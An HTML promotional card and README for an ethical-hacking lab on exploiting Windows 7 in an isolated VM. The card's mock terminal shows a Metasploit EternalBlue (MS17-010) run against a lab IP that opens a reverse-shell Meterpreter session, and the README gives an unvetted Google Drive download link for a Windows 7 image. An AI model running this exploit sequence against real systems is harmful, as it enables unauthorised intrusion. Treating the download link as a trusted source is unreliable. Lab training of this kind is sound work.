
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LinkedIn Post – Windows 7 Vuln Lab</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@700;800&family=DM+Sans:wght@400;500&display=swap');

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: #0a0a0f;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    font-family: 'DM Sans', sans-serif;
  }

  .card {
    width: 1200px;
    height: 628px;
    background: #0d0d18;
    position: relative;
    overflow: hidden;
    border: 1px solid #1a1a2e;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
  }

  /* Grid background */
  .grid {
    position: absolute;
    inset: 0;
    background-image:
      linear-gradient(rgba(0,200,150,0.04) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,200,150,0.04) 1px, transparent 1px);
    background-size: 40px 40px;
  }

  /* Glow blob */
  .glow {
    position: absolute;
    width: 600px;
    height: 600px;
    border-radius: 50%;
    background: radial-gradient(circle, rgba(0,255,160,0.07) 0%, transparent 70%);
    top: -150px;
    right: -100px;
    pointer-events: none;
  }
  .glow2 {
    position: absolute;
    width: 400px;
    height: 400px;
    border-radius: 50%;
    background: radial-gradient(circle, rgba(255,80,80,0.06) 0%, transparent 70%);
    bottom: -100px;
    left: 100px;
  }

  /* Scanlines */
  .scanlines {
    position: absolute;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(0,0,0,0.15) 2px,
      rgba(0,0,0,0.15) 4px
    );
    pointer-events: none;
  }

  /* Left accent bar */
  .accent-bar {
    position: absolute;
    left: 0;
    top: 0;
    bottom: 0;
    width: 4px;
    background: linear-gradient(180deg, #00ff9f, #00c8ff, #ff4f4f);
  }

  /* Corner decorations */
  .corner {
    position: absolute;
    width: 24px;
    height: 24px;
    border-color: #00ff9f;
    border-style: solid;
    opacity: 0.5;
  }
  .corner.tl { top: 20px; left: 20px; border-width: 2px 0 0 2px; }
  .corner.tr { top: 20px; right: 20px; border-width: 2px 2px 0 0; }
  .corner.bl { bottom: 20px; left: 20px; border-width: 0 0 2px 2px; }
  .corner.br { bottom: 20px; right: 20px; border-width: 0 2px 2px 0; }

  /* Content layout */
  .content {
    position: relative;
    z-index: 10;
    padding: 52px 64px;
    display: flex;
    height: 100%;
    gap: 60px;
    align-items: center;
  }

  .left {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 20px;
  }

  .tag-row {
    display: flex;
    gap: 10px;
    align-items: center;
  }

  .tag {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    letter-spacing: 0.12em;
    padding: 4px 12px;
    border-radius: 2px;
    text-transform: uppercase;
  }
  .tag.red { background: rgba(255,60,60,0.15); color: #ff6060; border: 1px solid rgba(255,60,60,0.3); }
  .tag.green { background: rgba(0,255,160,0.1); color: #00ff9f; border: 1px solid rgba(0,255,160,0.25); }
  .tag.blue { background: rgba(0,200,255,0.1); color: #00c8ff; border: 1px solid rgba(0,200,255,0.25); }

  .headline {
    font-family: 'Syne', sans-serif;
    font-weight: 800;
    font-size: 48px;
    line-height: 1.05;
    color: #f0f0f0;
    letter-spacing: -0.02em;
  }
  .headline span.accent { color: #00ff9f; }
  .headline span.red { color: #ff6060; }

  .subtext {
    font-size: 15px;
    color: #8888aa;
    line-height: 1.6;
    max-width: 460px;
  }

  .pills {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    margin-top: 4px;
  }

  .pill {
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    color: #aaaacc;
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    padding: 5px 14px;
    border-radius: 2px;
  }

  /* Right panel – terminal */
  .right {
    width: 420px;
    flex-shrink: 0;
  }

  .terminal {
    background: rgba(0,0,0,0.5);
    border: 1px solid rgba(0,255,160,0.2);
    border-radius: 6px;
    overflow: hidden;
    box-shadow: 0 0 40px rgba(0,255,160,0.08), inset 0 0 60px rgba(0,0,0,0.4);
  }

  .term-bar {
    background: rgba(0,255,160,0.06);
    padding: 8px 14px;
    display: flex;
    align-items: center;
    gap: 6px;
    border-bottom: 1px solid rgba(0,255,160,0.1);
  }

  .dot { width: 10px; height: 10px; border-radius: 50%; }
  .dot.r { background: #ff5f57; }
  .dot.y { background: #febc2e; }
  .dot.g { background: #28c840; }

  .term-title {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    color: #556655;
    margin-left: 6px;
    letter-spacing: 0.08em;
  }

  .term-body {
    padding: 18px 20px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 12.5px;
    line-height: 1.8;
    color: #44aa66;
  }

  .term-body .dim { color: #334433; }
  .term-body .bright { color: #00ff9f; }
  .term-body .warn { color: #ffaa00; }
  .term-body .err { color: #ff6060; }
  .term-body .info { color: #00c8ff; }
  .term-body .cursor {
    display: inline-block;
    width: 8px;
    height: 14px;
    background: #00ff9f;
    vertical-align: middle;
    animation: blink 1s step-end infinite;
  }

  @keyframes blink { 50% { opacity: 0; } }

  /* Bottom bar */
  .bottom-bar {
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    height: 48px;
    background: rgba(0,255,160,0.04);
    border-top: 1px solid rgba(0,255,160,0.1);
    display: flex;
    align-items: center;
    padding: 0 64px;
    gap: 32px;
    z-index: 20;
  }

  .stat {
    display: flex;
    align-items: center;
    gap: 8px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    color: #445544;
  }
  .stat span { color: #00ff9f; }

  .sep { flex: 1; height: 1px; background: rgba(255,255,255,0.04); }

  .hashtags {
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    color: #334466;
    letter-spacing: 0.05em;
  }
</style>
</head>
<body>
<div class="card">
  <div class="grid"></div>
  <div class="glow"></div>
  <div class="glow2"></div>
  <div class="scanlines"></div>
  <div class="accent-bar"></div>
  <div class="corner tl"></div>
  <div class="corner tr"></div>
  <div class="corner bl"></div>
  <div class="corner br"></div>

  <div class="content">
    <!-- LEFT -->
    <div class="left">
      <div class="tag-row">
        <span class="tag red">⚠ EOL OS</span>
        <span class="tag green">Lab Setup</span>
        <span class="tag blue">Ethical Hacking</span>
      </div>

      <div class="headline">
        Windows 7<br>
        <span class="accent">Vuln Lab</span><br>
        <span style="font-size:36px; color:#666688;">Hands-On Setup</span>
      </div>

      <p class="subtext">
        Learn how attackers exploit end-of-life systems — in a safe, isolated lab.
        From EternalBlue to MS17-010, understand what defenders need to know.
      </p>

      <div class="pills">
        <span class="pill">MS17-010 / EternalBlue</span>
        <span class="pill">Metasploit Framework</span>
        <span class="pill">VirtualBox / VMware</span>
        <span class="pill">Network Isolation</span>
        <span class="pill">Privilege Escalation</span>
      </div>
    </div>

    <!-- RIGHT: Terminal -->
    <div class="right">
      <div class="terminal">
        <div class="term-bar">
          <div class="dot r"></div>
          <div class="dot y"></div>
          <div class="dot g"></div>
          <span class="term-title">msfconsole — lab@kali</span>
        </div>
        <div class="term-body">
          <div class="dim">msf6 &gt; search ms17_010</div>
          <div class="bright">&nbsp;</div>
          <div class="info">&nbsp;# Matching Modules</div>
          <div class="dim">&nbsp;─────────────────────────</div>
          <div><span class="warn">0</span>  exploit/windows/smb/<span class="bright">ms17_010_eternalblue</span></div>
          <div><span class="warn">1</span>  exploit/windows/smb/<span class="bright">ms17_010_psexec</span></div>
          <div>&nbsp;</div>
          <div class="dim">msf6 &gt; use 0</div>
          <div class="dim">msf6 exploit(ms17_010) &gt; set RHOSTS</div>
          <div class="bright">&nbsp;&nbsp;RHOSTS =&gt; 192.168.56.101</div>
          <div class="dim">msf6 exploit(ms17_010) &gt; run</div>
          <div>&nbsp;</div>
          <div class="warn">[*] Started reverse TCP handler</div>
          <div class="bright">[+] <span class="bright">Meterpreter session 1 opened</span></div>
          <div class="dim">meterpreter &gt; <span class="cursor"></span></div>
        </div>
      </div>
    </div>
  </div>

  <!-- BOTTOM BAR -->
  <div class="bottom-bar">
    <div class="stat">CVEs Covered: <span>12+</span></div>
    <div class="stat">Difficulty: <span>Beginner → Mid</span></div>
    <div class="stat">Environment: <span>Isolated VM</span></div>
    <div class="sep"></div>
    <div class="hashtags">#CyberSecurity &nbsp;#EthicalHacking &nbsp;#PenTest &nbsp;#BlueTeam &nbsp;#InfoSec</div>
  </div>
</div>
</body>
</html>

# Windows 7 Vulnerability Assessment Lab

WINDOWS 7 DOWNLOAD LINK : https://drive.google.com/file/d/11pcEsaaUBWIMDBdJh7TowNvnvvBWb4Wp/view?usp=drive_link

## Overview
This repository contains notes, documentation, and security research related to Windows 7 vulnerability assessment and analysis in a controlled lab environment.

## Purpose
The objective of this project is to:
- Understand common Windows 7 security weaknesses.
- Study publicly disclosed vulnerabilities and CVEs.
- Learn vulnerability assessment methodologies.
- Practice system hardening and mitigation techniques.
- Improve cybersecurity and penetration testing knowledge.

## Topics Covered
- Windows 7 Security Fundamentals
- Vulnerability Assessment
- CVE Analysis
- Network Security
- System Hardening
- Patch Management
- Risk Assessment

## Lab Environment
- Target OS: Windows 7
- Testing Environment: Isolated Virtual Lab
- Tools Used:
  - Nmap
  - msfconsole

## Disclaimer
This repository is intended for educational and authorized security testing purposes only. All research and testing should be conducted in a legal and controlled environment. Unauthorized access to systems is prohibited.

## Author
**Neeraj Rajeev**
Cybersecurity Analyst | VAPT Enthusiast

---
⭐ Feel free to contribute, share feedback, and collaborate on cybersecurity research.
